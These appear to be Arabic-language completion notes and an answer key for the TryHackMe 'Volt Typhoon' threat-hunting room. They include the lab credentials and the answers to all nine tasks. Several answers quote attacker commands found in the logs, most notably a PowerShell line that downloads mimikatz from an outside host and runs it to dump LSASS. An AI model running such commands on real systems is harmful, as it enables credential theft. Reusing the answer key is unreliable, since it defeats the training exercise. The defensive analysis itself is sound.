# ملاحظات TryHackMe — Volt Typhoon

الرابط: https://tryhackme.com/room/volttyphoon

## بيانات المختبر

تم الانضمام إلى الغرفة وتشغيل Lab Machine. اسم المختبر هو `Volt Typhoon v6-badr`، وعنوانه الحالي `10.49.128.168`، وحالته **On**. عنوان Splunk الظاهر في الغرفة هو `http://10.49.128.168:8000`، وبيانات الدخول الظاهرة هي المستخدم `volthunter` وكلمة المرور `voltyp1010`. لا حاجة إلى تشغيل AttackBox حالياً لأن عنوان Splunk متاح للوصول المباشر.

## حالة التقدم

نسبة التقدم عند بدء الغرفة: 0%. Task 1 مفتوحة، وسؤالها هو: `I understand my duties and have started the attached lab machine.` والإجابة المتوقعة `No answer needed`.

## المهام

تتضمن الغرفة تسع مهام: Task 1 IR Scenario، Task 2 Initial Access، Task 3 Execution، Task 4 Persistence، Task 5 Defense Evasion، Task 6 Credential Access، Task 7 Discovery & Lateral Movement، Task 8 Collection، وTask 9 C2 & Cleanup. لم تُدخل إجابات المهام التحليلية بعد.

## المصادر

سيتم الاعتماد أولاً على سجلات Splunk ومواد الغرفة، ثم مقارنة الإجابات بمراجع خارجية موثوقة عند الحاجة، مع التحقق النهائي من كل إجابة بواسطة زر Check داخل TryHackMe.

## إجابات مرجعية مكتشفة من walkthroughs

المصادر الخارجية للمقارنة:
- https://github.com/Paulus1337/Volt-Typhoon-Write-up
- https://medium.com/@0xgbreil/volt-typhoon-room-tryhackme-walkthrough-b67052858d1d
- https://darkyolks.com/write-ups/2025/12/29/TryHackMe-Volt-Typhoon-Write-Up/

| المهمة | السؤال المختصر | الإجابة المرجعية |
|---|---|---|
| Task 2 | وقت تغيير كلمة مرور Dean بصيغة ISO 8601 | `2024-03-24T11:10:22` |
| Task 2 | اسم الحساب الإداري الجديد | `voltyp-admin` |
| Task 3 | أمر WMIC لجمع معلومات الأقراص من server01 وserver02 | `wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename` |
| Task 3 | كلمة مرور أرشيف قاعدة AD | `d5ag0nm@5t3r` |
| Task 4 | مجلد وضع web shell | `C:\Windows\Temp\` |
| Task 5 | cmdlet حذف سجل Most Recently Used | `Remove-ItemProperty` |
| Task 5 | اسم الملف بعد تغيير الامتداد | `cl64.gif` |
| Task 5 | مسار Registry لفحص البيئة الافتراضية | `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control` |
| Task 6 | البرامج الثلاثة بترتيب أبجدي | `OpenSSH, putty, realvnc` |
| Task 6 | الأمر الكامل المفكوك لتنزيل وتشغيل Mimikatz | `Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait` |
| Task 7 | Event IDs التي يبحث عنها attacker باستخدام wevtutil | `4624 4625 4769` |
| Task 7 | اسم web shell الجديد على server-02 | `AuditReport.jspx` |
| Task 8 | الملفات المالية الثلاثة المنسوخة | `2022.csv 2023.csv 2024.csv` |
| Task 9 | عنوان وPort الاتصال للـ proxy | `10.2.30.1 8443` |
| Task 9 | أنواع السجلات الأربعة التي تم مسحها | `Application Security Setup System` |

ملاحظة: سيتم التحقق من كل قيمة داخل TryHackMe، ولن تُعتبر مؤكدة نهائياً إلا بعد ظهور `Correct Answer`.

## التحقق النهائي

تم التحقق من جميع الإجابات داخل متصفح المستخدم، ثم ظهرت صفحة TryHackMe الرسمية: **Room completed!** مع `Completed tasks: 9` و`Points earned: 450`.

| المهمة | الإجابة المؤكدة داخل TryHackMe |
|---|---|
| Task 1 | No answer needed |
| Task 2.1 | `2024-03-24T11:10:22` |
| Task 2.2 | `voltyp-admin` |
| Task 3.1 | `wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename` |
| Task 3.2 | `d5ag0nm@5t3r` |
| Task 4 | `C:\Windows\Temp\` |
| Task 5.1 | `Remove-ItemProperty` |
| Task 5.2 | `cl64.gif` |
| Task 5.3 | `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control` |
| Task 6.1 | `OpenSSH, putty, realvnc` |
| Task 6.2 | `Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait` |
| Task 7.1 | `4624 4625 4769` |
| Task 7.2 | `AuditReport.jspx` |
| Task 8 | `2022.csv 2023.csv 2024.csv` |
| Task 9.1 | `10.2.30.1 8443` |
| Task 9.2 | `Application Security Setup System` |

صفحة الإكمال: `https://tryhackme.com/room/volttyphoon/congratulations?step=records`
